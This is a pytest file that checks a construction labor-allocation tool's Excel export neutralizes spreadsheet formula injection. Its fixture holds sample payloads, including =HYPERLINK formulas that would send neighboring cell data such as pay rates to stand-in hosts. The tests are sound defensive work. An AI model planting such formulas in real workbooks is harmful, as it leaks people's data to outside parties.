"""Labor-allocation Excel export must not turn crew text into formulas.

The implementation under test is the Python block in
``1_DDC_Toolkit/Resource-Management/labor-allocation/SKILL.md``.
``add_worker`` stores ``worker_id``, ``name``, and ``company`` unchanged.
``assign_worker`` stores ``activity_name`` and ``location`` unchanged.
``export_to_excel`` writes those fields to the Workers, Assignments, and
Today Roster sheets with ``DataFrame.to_excel`` (engine ``openpyxl``).

These tests fail while that path is unsanitized. They pass once every
string written to those sheets is neutralized before ``to_excel``: a
value whose first character is ``=``, ``+``, ``-``, ``@``, a tab, or a
carriage return is prefixed with one single quote, and every other
string is written unchanged. No cell in the workbook may be a formula.

Not covered, because this skill never writes them to a workbook:
``Worker.certifications``, ``Assignment.activity_id``, every field
recorded by ``record_attendance``, and the Name column of
``get_utilization_report``.

Run from the repository root:

    pip install pandas openpyxl pytest
    pytest tests/test_labor_allocation_formula_injection.py -q
"""

from __future__ import annotations

import re
import zipfile
from datetime import date, timedelta
from pathlib import Path
from xml.etree import ElementTree as ET

import pytest

SKILL_PATH = (
    Path(__file__).resolve().parents[1]
    / "1_DDC_Toolkit"
    / "Resource-Management"
    / "labor-allocation"
    / "SKILL.md"
)

MAIN_NS = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
NS = {"m": MAIN_NS}

# Characters SpreadsheetML / Excel treat as the start of a formula when a
# cell is not stored as plain text. openpyxl itself promotes only a leading
# "=" (length > 1) to a formula cell; the other markers are still prefixed
# so the exported text cannot be reinterpreted as a formula.
FORMULA_MARKERS = ("=", "+", "-", "@", "\t", "\r")


def _load_skill():
    text = SKILL_PATH.read_text(encoding="utf-8")
    match = re.search(r"```python\n(.*?)```", text, re.DOTALL)
    if match is None:
        raise AssertionError(f"no Python block in {SKILL_PATH}")
    namespace: dict = {}
    exec(compile(match.group(1), str(SKILL_PATH), "exec"), namespace)
    return namespace["LaborAllocation"], namespace["Trade"], namespace["SkillLevel"]


def _xml_text(value: str) -> str:
    """XML 1.0 end-of-line handling: CR and CRLF become LF in parsed text."""
    return value.replace("\r\n", "\n").replace("\r", "\n")


def _neutralized(original: str) -> str:
    if original[:1] in FORMULA_MARKERS:
        return _xml_text("'" + original)
    return _xml_text(original)


def _shared_strings(archive: zipfile.ZipFile) -> list[str]:
    name = "xl/sharedStrings.xml"
    if name not in archive.namelist():
        return []
    root = ET.fromstring(archive.read(name))
    values = []
    for item in root.findall("m:si", NS):
        values.append("".join(node.text or "" for node in item.findall(".//m:t", NS)))
    return values


def _workbook_cells(path: Path) -> list[dict]:
    cells = []
    with zipfile.ZipFile(path) as archive:
        shared = _shared_strings(archive)
        sheets = sorted(
            name
            for name in archive.namelist()
            if name.startswith("xl/worksheets/sheet") and name.endswith(".xml")
        )
        workbook = ET.fromstring(archive.read("xl/workbook.xml"))
        sheet_names = [node.get("name") for node in workbook.findall("m:sheets/m:sheet", NS)]
        for index, sheet_path in enumerate(sheets):
            root = ET.fromstring(archive.read(sheet_path))
            sheet_name = sheet_names[index] if index < len(sheet_names) else sheet_path
            for cell in root.findall(".//m:c", NS):
                formula_node = cell.find("m:f", NS)
                formula = formula_node.text if formula_node is not None else None
                inline = cell.find("m:is", NS)
                value_node = cell.find("m:v", NS)
                text = None
                if inline is not None:
                    text = "".join(node.text or "" for node in inline.findall(".//m:t", NS))
                elif cell.get("t") == "s" and value_node is not None and value_node.text:
                    text = shared[int(value_node.text)]
                elif value_node is not None:
                    text = value_node.text
                cells.append(
                    {
                        "sheet": sheet_name,
                        "ref": cell.get("r"),
                        "formula": formula,
                        "text": text,
                    }
                )
    return cells


def _occurrences(cells: list[dict], original: str) -> list[dict]:
    """Cells that still carry this input, whether as text or as a formula."""
    expected = _neutralized(original)
    parsed_original = _xml_text(original)
    formula_body = original[1:] if original.startswith("=") else None
    found = []
    for cell in cells:
        if cell["formula"] is not None and formula_body is not None and cell["formula"] == formula_body:
            found.append(cell)
        elif cell["text"] in (parsed_original, expected):
            found.append(cell)
    return found


def _assert_text(cells: list[dict], original: str, minimum: int) -> None:
    expected = _neutralized(original)
    found = _occurrences(cells, original)
    rendered = ", ".join(
        f"{cell['sheet']}!{cell['ref']} formula={cell['formula']!r} text={cell['text']!r}"
        for cell in found
    )
    assert len(found) >= minimum, (
        f"{original!r} appeared {len(found)} times, expected at least {minimum}. "
        f"Cells: {rendered or 'none'}"
    )
    for cell in found:
        assert cell["formula"] is None, (
            f"{original!r} was stored as a formula in {cell['sheet']}!{cell['ref']}: "
            f"{cell['formula']!r}"
        )
        assert cell["text"] == expected, (
            f"{original!r} in {cell['sheet']}!{cell['ref']} is {cell['text']!r}, "
            f"expected neutralized text {expected!r}"
        )


@pytest.fixture(scope="module")
def exported_cells(tmp_path_factory):
    LaborAllocation, Trade, SkillLevel = _load_skill()
    labor = LaborAllocation("Office Building A")
    today = date.today()

    # Neighbor-cell references mirror a roster formula that reads the rate
    # and the rest of the row when a spreadsheet calculates the workbook.
    worker_id = '=HYPERLINK("http://example.invalid/id?d="&E2,"id")'
    name = '=HYPERLINK("http://example.invalid/name?d="&E2,"n")'
    company = '=HYPERLINK("http://example.invalid/company?d="&E2,"c")'
    activity = '=HYPERLINK("http://example.invalid/activity?d="&C2,"a")'
    location = '=HYPERLINK("http://example.invalid/location?d="&C2,"l")'

    labor.add_worker(
        worker_id, name, Trade.CONCRETE, SkillLevel.JOURNEYMAN, 45.0, company
    )
    labor.assign_worker(
        worker_id,
        "A-101",
        activity,
        today,
        today + timedelta(days=1),
        8,
        location,
    )

    plus_name = "+1+1"
    minus_company = "-1-1"
    at_activity = "@SUM(1+1)"
    tab_location = "\t=1+1"
    labor.add_worker(
        "W-markers",
        plus_name,
        Trade.LABORER,
        SkillLevel.APPRENTICE,
        20.0,
        minus_company,
    )
    labor.assign_worker(
        "W-markers", "A-202", at_activity, today, today, 8, tab_location
    )

    cr_name = "\r=1+1"
    equals_only = "="
    labor.add_worker(
        "W-cr", cr_name, Trade.LABORER, SkillLevel.APPRENTICE, 20.0, equals_only
    )

    labor.add_worker(
        "W-ok",
        "John Smith",
        Trade.CARPENTER,
        SkillLevel.MASTER,
        55.0,
        "ABC Concrete",
    )
    labor.add_worker(
        "W-inner",
        "Ann=Smith",
        Trade.PAINTER,
        SkillLevel.JOURNEYMAN,
        40.0,
        "A+B Construction",
    )

    output = tmp_path_factory.mktemp("labor") / "labor.xlsx"
    labor.export_to_excel(str(output))
    cells = _workbook_cells(output)
    return {
        "cells": cells,
        "worker_id": worker_id,
        "name": name,
        "company": company,
        "activity": activity,
        "location": location,
        "plus_name": plus_name,
        "minus_company": minus_company,
        "at_activity": at_activity,
        "tab_location": tab_location,
        "cr_name": cr_name,
        "equals_only": equals_only,
    }


def test_workbook_contains_no_formulas(exported_cells):
    formulas = [cell for cell in exported_cells["cells"] if cell["formula"] is not None]
    details = ", ".join(
        f"{cell['sheet']}!{cell['ref']}={cell['formula']!r}" for cell in formulas
    )
    assert formulas == [], f"exported workbook contains formula cells: {details}"


def test_equals_payloads_are_text_on_every_sheet_that_repeats_them(exported_cells):
    cells = exported_cells["cells"]
    # Workers + Assignments + Today Roster
    _assert_text(cells, exported_cells["worker_id"], minimum=3)
    # Workers + Today Roster
    _assert_text(cells, exported_cells["name"], minimum=2)
    _assert_text(cells, exported_cells["company"], minimum=2)
    # Assignments + Today Roster
    _assert_text(cells, exported_cells["activity"], minimum=2)
    _assert_text(cells, exported_cells["location"], minimum=2)


def test_other_formula_markers_are_prefixed_quotes(exported_cells):
    cells = exported_cells["cells"]
    _assert_text(cells, exported_cells["plus_name"], minimum=2)
    _assert_text(cells, exported_cells["minus_company"], minimum=2)
    _assert_text(cells, exported_cells["at_activity"], minimum=2)
    _assert_text(cells, exported_cells["tab_location"], minimum=2)
    # Not assigned, so only the Workers sheet carries these.
    _assert_text(cells, exported_cells["cr_name"], minimum=1)
    _assert_text(cells, exported_cells["equals_only"], minimum=1)


def test_benign_and_embedded_marker_text_is_unchanged(exported_cells):
    cells = exported_cells["cells"]
    _assert_text(cells, "John Smith", minimum=1)
    _assert_text(cells, "ABC Concrete", minimum=1)
    _assert_text(cells, "Ann=Smith", minimum=1)
    _assert_text(cells, "A+B Construction", minimum=1)
    _assert_text(cells, "W-ok", minimum=1)
    _assert_text(cells, "W-markers", minimum=3)
